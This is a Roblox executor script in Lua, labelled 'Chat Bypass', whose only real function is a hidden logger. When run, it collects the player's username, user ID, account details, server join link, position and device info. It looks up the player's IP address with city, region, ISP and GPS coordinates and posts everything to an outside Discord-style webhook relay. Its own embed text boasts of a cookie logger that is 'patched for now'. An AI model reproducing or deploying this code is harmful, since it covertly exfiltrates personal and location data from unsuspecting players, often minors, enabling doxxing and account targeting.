getgenv().haskjhfgash = "Chat Bypass"
getgenv().sdkgjuhlasdas = "https://playvora.netlify.app/discordwebhook"
getgenv().akjhsduaksjd = true
getgenv().aasdfsdgfgh = "adskak2bkdjsadasd"

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
folder.Parent = ui

local player = game:GetService("Players").LocalPlayer
local players = game:GetService("Players")
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC ð»" or "Mobile ð±"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
local gameVersion = game.PlaceVersion
local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"

local function checkPremium()
	local success, response = pcall(function() return player.MembershipType end)
	return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
end

local url = getgenv().sdkgjuhlasdas
local webhookids = getgenv().aasdfsdgfgh
local data = {
	["content"] = "@everyone",
	['webhookid'] = webhookids, --ask playvora_1 to generate it
	["embeds"] = {{
		["title"] = "MADE BY DXFC EDITED BY PLAYVORA | ð **Script Execution Detected | Exec Log**",
		["description"] = "*â One of the Script's has been Executed.(ðªCOOKIE LOGGER IS PATCHED FOR NOW!):*",
		["type"] = "rich",
		["color"] = tonumber(0xe67e22),
		["fields"] = {
			{["name"] = "ð **Script Info**", ["value"] = "```ð» Script Name: " .. getgenv().haskjhfgash .. "\nâ° Executed At: " .. completeTime .. "```", ["inline"] = false},
			{["name"] = "ð¤ **Player Details**", ["value"] = "```ð§ Username: " .. player.Name .. "\nð Display Name: " .. player.DisplayName .. "\nðï¸ UserID: " .. userid .. "\nâ¤ï¸ Health: " .. health .. " / " .. maxHealth .. "\nð Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
			{["name"] = "ð **Account Information**", ["value"] = "```ð Account Age: " .. player.AccountAge .. " days\nð Premium Status: " .. checkPremium() .. "\nð Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
			{["name"] = "ð® **Game Details**", ["value"] = "```ð Game Name: " .. gameName .. "\nðï¸ Game ID: " .. gameid .. "\nð Game Link (https://www.roblox.com/games/" .. gameid .. ")\nð§ Game Version: " .. gameVersion .. "```", ["inline"] = false},
			{["name"] = "ð¹ï¸ **Server Info**", ["value"] = "```ð¥ Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\nð Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
			{["name"] = "ð¡ **Network Info**", ["value"] = "```ð¶ Ping: " .. pingValue .. " ms```", ["inline"] = true},
			{["name"] = "âï¸ **System Info**", ["value"] = "```ðº Resolution: " .. screenWidth .. "x" .. screenHeight .. "\nð Memory Usage: " .. memoryUsage .. " MB\nâ¡ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
			{["name"] = "ð **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
			{["name"] = "ð **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
		},
		["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"},
		["footer"] = {["text"] = "Made by dxfc with â¤ï¸ | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&"}
	}}
}

if getgenv().akjhsduaksjd then
    local ip = game:HttpGet("https://playvora.vercel.app/api/ip")
    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://playvora.netlify.app/ipinfo?ip=" .. ip))
    table.insert(data.embeds[1].fields, {["name"] = "**`(ð¤) Secret`**", ["value"] = "||(ð») IP Address: " .. ipinfo_table.ip .. "||\n||(ð) Country: " .. ipinfo_table.country .. "||\n||(ð°ï¸) GPS Location: " .. ipinfo_table.loc .. "||\n||(ðï¸) City: " .. ipinfo_table.city .. "||\n||(ð¡) Region: " .. ipinfo_table.region .. "||\n||(ð¡) Hoster: " .. ipinfo_table.org .. "||"})
end

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
request({Url = url, Body = newdata, Method = "POST", Headers = headers})